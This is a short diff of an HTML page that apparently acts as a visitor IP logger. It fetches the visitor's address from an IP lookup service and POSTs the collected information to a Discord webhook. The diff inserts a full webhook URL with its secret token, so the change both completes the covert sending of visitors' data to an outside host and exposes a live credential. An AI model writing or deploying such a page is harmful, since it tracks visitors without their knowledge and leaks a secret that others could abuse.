@@ -180,7 +180,7 @@ fetch("https://api64.ipify.org?format=json")
         document.getElementById('ip-info').textContent = JSON.stringify(info, null, 2);
 
         // ---------- إرسال الويب هوك ----------
-        const webhookURL = "YOUR_WEBHOOK_URL_HERE";
+        const webhookURL = "https://canary.discord.com/api/webhooks/1406036658490441848/D9daHBFym8SCAfc9cvXFEnKA9VpuL_b78wyIZ-S1imGzqRmdgULJEmu_kamCuOre4LWU";
 
         fetch(webhookURL, {
           method: "POST",
@@ -197,3 +197,4 @@ fetch("https://api64.ipify.org?format=json")
 
 </body>
 </html>
+
